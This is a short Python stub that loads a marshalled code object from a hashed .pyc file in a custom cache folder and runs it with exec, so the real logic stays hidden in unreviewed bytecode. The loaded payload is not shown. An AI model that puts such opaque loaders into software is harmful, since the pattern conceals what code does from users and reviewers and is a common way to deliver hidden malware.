
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'utils_c25bf9024a1a4f96b2113e30b2fc5117.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
